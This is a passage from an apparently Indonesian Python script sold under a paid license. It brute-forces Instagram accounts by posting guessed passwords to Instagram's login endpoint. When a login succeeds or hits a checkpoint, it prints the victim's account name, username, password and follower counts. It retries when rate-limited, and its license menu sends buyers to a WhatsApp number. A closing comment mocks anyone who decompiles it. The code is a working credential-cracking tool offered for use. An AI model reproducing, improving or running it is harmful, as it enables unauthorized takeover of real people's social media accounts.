				param = {"username": email_dev,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}{}".format(random.randint(1000000000, 99999999999), san_dev,y),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}}
			print (P+" "+str(c)+"."+O+" password"+M+" > "+K+san_dev+"                ")
			with requests.Session() as ses_dev:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses_dev.post(url+post_+y, data=param, headers=header)
				data_dev = json.loads(respon.content)
				l = q.replace(q, "")
				if "checkpoint_url" in str(data_dev):
					print (f"""{J}╔══[ {K}Checkpoint                      
{J}║══[{K} Nama akun {M}> {K}{nama}
{J}║══[{K} Username  {M}> {K}{email_dev}
{J}║══[{K} Password  {M}> {K}{san_dev}
{J}║══[{K} Followers  {M}> {K}{str(pengikut)}
{J}╚══[{K} Following  {M}> {K}{str(mengikuti)}
					""")
					break
				elif "userId" in str(data_dev):
					print (f"""{J}╔══[ {H}Berhasil                      
{J}║══[{H} Nama akun {M}> {H}{nama}
{J}║══[{H} Username  {M}> {H}{email_dev}
{J}║══[{H} Password  {M}> {H}{san_dev}
{J}║══[{H} Followers  {M}> {H}{str(pengikut)}
{J}╚══[{H} Following  {M}> {H}{str(mengikuti)}
					""")
					break
				elif "Please wait" in str(data_dev):					
					print ("\r%s! Mode pesawatkan 2 detik  "%(M))
					san_dev_split = san_dev.split()
					brute(email_dev, san_dev_split)
				else:
					pass
					looping+=1
		except requests.exceptions.ConnectionError:
			san_dev_split = san_dev.split()
			brute(email_dev, san_dev_split)
		except KeyboardInterrupt:
			exit("%s• Keluar...."%(M))
		except:
			pass
			
# LISENSI
def get_license(integer):
    lis = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789")
    gets = [random.choice(lis) for _ in range(integer)]
    return "".join(gets).upper()

class key:
	
	def __init__(self):
		self=[]
	
	def konfirmasi(self):
		os.system("clear")
		banner()
		print('\n')
		print ('\x1b[1;95m•\x1b[1;96m Mohon tunggu ...');jeda(1)
		digit = random.choice([20])
		id = get_license(digit)
		lpg = open('data/lisensi.txt', 'w')
		lpg.write(id)
		lpg.close()
		print ("\n\n%s•%s Daftar list harga %s:"%(U,O,M));jeda(0.07)
		print ("  %s-%s 20k 1 minggu"%(P,O));jeda(0.07)
		print ("  %s-%s 60k 1 bulan"%(P,O));jeda(0.07)
		jalan ('\n%s• %sLisensi%s : %s%s'%(U,O,M,H,id));jeda(1)
		jalan ('%s• %sLisensi Belum Di konfirmasi'%(U,O))
		suh=input("\n%s•%s ingin beli lisensi? y/t %s: %s"%(U,O,M,K))
		if suh in['']:
			exit()
		elif suh in["y","Y"]:
			jalan ("\n%s•%s menuju ke whatsap untuk membeli lisensi "%(U,O))
			jalan ("%s•%s no whatsap saya %s: %s+6282371648186 "%(U,O,M,H))
			os.system('am start https://wa.me/+6282371648186?text=Assalamualaikum+saya+ingin+beli+lisensi:+'+id+'>/dev/null');jeda(1)
			exit()
		elif suh in["t","T"]:
			exit()
		elif suh in["python2 bff-2.py"]:
			menu()
		else:
			exit()

if __name__=="__main__":
	Masuk()
	
"""

    Biar apa sih di decompile anyink
    Taekkk !

"""
